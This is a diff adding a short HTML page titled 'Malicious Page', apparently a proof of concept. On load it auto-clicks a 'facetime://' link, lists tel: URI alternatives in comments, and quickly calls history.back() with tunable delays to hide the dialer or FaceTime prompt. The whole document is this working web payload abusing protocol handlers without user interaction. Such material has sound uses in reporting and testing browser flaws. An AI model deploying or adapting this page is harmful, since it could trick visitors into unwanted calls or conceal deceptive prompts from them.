@@ -1,0 +1,39 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width,initial-scale=1" />
+    <title>Malicious Page</title>
+  </head>
+  <body>
+    <script>
+      // Try to trigger tel: dialog and navigate back quickly
+      window.onload = function () {
+        setTimeout(function () {
+
+          // Method A: create <a> → .click()
+          var link = document.createElement("a");
+          link.href = "facetime://";           // ← change number here
+          // link.style.display = "none";   // optional
+          document.body.appendChild(link);
+          link.click();
+
+          // Method B: direct location change (often more reliable on mobile)
+          // window.location.href = "tel:+123";
+
+          // Method C: location assign (sometimes behaves differently)
+          // window.location = "tel:+123";
+          // window.location.assign("tel:+123");
+
+          // Quickly try to go back (works best if the dialer dialog cancels navigation)
+          setTimeout(function() {
+            history.back();
+          }, 200);   // very short delay — experiment with 0–150 ms
+
+        }, 1000);   // initial delay — same as your original example
+      };
+    </script>
+
+    <p>Loading...</p>
+  </body>
+</html>
